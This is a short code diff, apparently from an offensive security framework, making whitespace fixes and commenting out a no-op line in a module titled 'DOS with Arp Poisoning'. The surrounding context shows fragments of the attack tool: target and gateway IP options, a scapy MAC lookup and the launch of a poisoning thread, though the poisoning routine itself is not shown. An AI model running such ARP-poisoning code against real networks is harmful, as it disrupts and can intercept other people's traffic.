@@ -20,7 +20,7 @@ class Module:
 		'Author': ['@enddo'],
 		'Description': ("DOS with Arp Poisoning"),
 
-        }
+		}
 	options = {
 		'Master'	:[''		,True	,'The master IP address'],
 		'Slave'		:[''		,True	,'The slave IP address'],
@@ -60,7 +60,7 @@ class Module:
 					sys.exit(0)
 		def get_mac(ip_address):
 			ans,unasn = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
-			ans.res
+			# ans.res
 			return ans.res[0][1][Ether].src
 		
 		
@@ -84,7 +84,7 @@ class Module:
 			self.printLine('[+] Slave MAC: '+target_mac,bcolors.OKGREEN)
 		
 		def signal_handler(signal, frame):
-		        sys.exit(0)
+				sys.exit(0)
 			
 		signal.signal(signal.SIGINT, signal_handler)
 		poison_thread = threading.Thread(target = poison_target,args=(gatway_ip,gatway_mac,target_ip,target_mac))
